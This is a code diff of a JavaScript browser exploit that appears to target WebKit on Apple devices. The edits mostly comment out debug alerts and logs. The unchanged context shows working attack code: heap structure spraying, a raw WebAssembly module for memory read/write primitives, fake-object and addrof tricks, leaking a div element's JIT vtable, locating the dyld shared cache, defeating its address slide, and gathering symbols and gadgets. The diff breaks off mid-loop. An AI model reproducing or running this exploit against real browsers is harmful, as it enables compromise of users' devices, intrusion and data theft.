@@ -65,7 +65,7 @@ function off2addr(segs, off)
         {
             var start = segs[i].fileoff;
             var end   = Add(start, segs[i].size);
-            alert("start" + start + "end" + end + "off" + off)
+           // alert("start" + start + "end" + end + "off" + off)
             if
             (
                 (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
@@ -73,7 +73,7 @@ function off2addr(segs, off)
             )
             {
                 //logic = 1;
-                alert("returning"+ Add(segs[i].addr, Sub(off, start)));
+               // alert("returning"+ Add(segs[i].addr, Sub(off, start)));
                 return Add(segs[i].addr, Sub(off, start));
             }
 
@@ -234,8 +234,8 @@ function exploit(){
     }
     function pwn()
     {
-        alert("starting");
-        log('[*] Spraying structures to get a butterfly (1/2)...');
+        //alert("starting");
+        //log('[*] Spraying structures to get a butterfly (1/2)...');
         // copy paste from: 
         // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
         var structs = [];
@@ -245,14 +245,14 @@ function exploit(){
             structs.push(a);
         }
         
-        log('[*] Spraying structures to get a butterfly (2/2)...');
+        //log('[*] Spraying structures to get a butterfly (2/2)...');
         for (var i = 0; i < 5000; i++) {
             var a = new WebAssembly.Memory({inital: 0});
             a['prop' + i] = 1337;
             structs.push(a);
         }
         
-        log('[*] Preparing R/W primitives...');
+        //log('[*] Preparing R/W primitives...');
         
         var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
         var webAssemblyBuffer = str2ab(webAssemblyCode);
@@ -306,7 +306,7 @@ function exploit(){
             //log("[+] Got A NAN address which invalid reloading");
             fail("[+] Got A NAN address which invalid reloading");
         }
-        log('[+] Got WebAssembly buffer at 0x'+wasmBufferRawAddr.toString(16));
+        //log('[+] Got WebAssembly buffer at 0x'+wasmBufferRawAddr.toString(16));
         let u = new Int64(wasmBufferRawAddr).toString()[9];
         var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
         var maxtry = 0;
@@ -320,7 +320,7 @@ function exploit(){
             }
         }
     } else {
-        log('[+] Successfully got fakeobj as WASMObject');
+        //log('[+] Successfully got fakeobj as WASMObject');
     }
         
         var wasmMemRawAddr = __addrof(wasmInternalMemory);
@@ -334,7 +334,7 @@ function exploit(){
             }
         };
         
-        log('[*] We now have early R/W primitives that should work with the WASM memory...');
+        //log('[*] We now have early R/W primitives that should work with the WASM memory...');
         
         function read_i64(readingFunc, offset) {
             var low = readingFunc(offset * 4);
@@ -408,7 +408,7 @@ function exploit(){
         writer.write_i64(0, new Int64('0x0000000000000007'));
         writer.write_i64(2, new Int64('0x0000000000000007'));
         
-        log('[*] We now have stable R/W primitives, hooray!');
+        //log('[*] We now have stable R/W primitives, hooray!');
         var memory = {
             create_writer: function(addrObj) {
                 if (addrObj instanceof Int64) {
@@ -482,17 +482,17 @@ function exploit(){
             addr= new Int64(addr);
             return new Int64('0x'+memory.read_i8(Add(addr, 3)).toString(16) + memory.read_i8(Add(addr, 2)).toString(16) + memory.read_i8(Add(addr, 1)).toString(16) + memory.read_i8(addr).toString(16));
         };
-        log('[*] Creating the HTMLDivElement wrapper...');
+        //log('[*] Creating the HTMLDivElement wrapper...');
         var d = document.createElement('div');
         let ad_div = addrof(d);
-        log('[+] Address of the div is '+ad_div.toString(16));
+       // log('[+] Address of the div is '+ad_div.toString(16));
         alert(FPO)
         let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
-        log('[+] Executable instance is at '+exe_ptr.toString(16));
+        //log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr,0);
-        log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
+        //log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb,0);
-        log('anchor' + anchor)
+        //log('anchor' + anchor)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         var b = [];
         //var vtab = 0x1B205A808;
@@ -594,15 +594,15 @@ function exploit(){
         hdr = Sub(hdr, 0x1000);
         }
 
-        alert('dyld cache header @' + hdr);
+        //alert('dyld cache header @' + hdr);
         var uuid = memory.u32(Add(hdr, 0x58));
-        alert("uuid:" + uuid) //+ "uuid..."+ memory.read_i64(hdr + 0x58))
+       // alert("uuid:" + uuid) //+ "uuid..."+ memory.read_i64(hdr + 0x58))
         //var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
         
         function ab2str(buf) {
   return String.fromCharCode.apply(null, new Uint16Array(buf));
 }
-        alert('Mach-O magic' + memory.u32(hdr))
+        //alert('Mach-O magic' + memory.u32(hdr))
         var base_seg = null;
        // alert("nsegs test" + memory.read_i32(hdr+0x14))
         var nsegs    = memory.u32(Add(hdr, 0x14));
@@ -653,12 +653,12 @@ function exploit(){
             if(init_rights.length < 4){
                 init_rights = "-" + init_rights;
             }
-            log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
+           // log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
             //memory.read_i32(
             if(seg.fileoff == 0 && seg.size != 0)
             {
                 base_seg = seg;
-                alert(base_seg.addr)
+               // alert(base_seg.addr)
             }
         }
         if(base_seg == null)
@@ -666,7 +666,7 @@ function exploit(){
             fail("base_seg");
         }
         var cache_slide = Sub(hdr, base_seg.addr);
-        alert("cache slide" + cache_slide + "vs" + memory.u32(hdr+0x38));
+        //alert("cache slide" + cache_slide + "vs" + memory.u32(hdr+0x38));
         //base_seg.addr = Add(base_seg.addr, cache_slide
 
         for(var i = 0; i < segs.length; ++i)
@@ -715,11 +715,11 @@ function exploit(){
        
         var syms = {};
         var gadgets = {};
-        alert("dyld base address" + memory.u32(hdr + 0x20))
+      //  alert("dyld base address" + memory.u32(hdr + 0x20))
         var imgs  = Add(hdr, memory.u32(Add(hdr, 0x88)));
-        alert("imgs"+imgs)
+        //alert("imgs"+imgs)
         var nimgs = memory.u32(Add(hdr, 0x1c));
-        alert(nimgs + "n")
+        //alert(nimgs + "n")
         for(var i = 0; i < nimgs; ++i)
         {
             var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x1c)));
@@ -727,9 +727,9 @@ function exploit(){
             {
                 return memory.read(Add(straddr, i), 1)[0];
             };
-            alert(ab2str(fn()))
+            alert(ab2str(fn(i)))
             var base = Add(memory.readInt64(Add(imgs, i * 0x20 + 0x10)), cache_slide);
-            alert(base + "vs" + memory.u32(Add(imgs,i * 0x20 + 0x10)))
+           // alert(base + "vs" + memory.u32(Add(imgs,i * 0x20 + 0x10)))
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
                alert("here1")
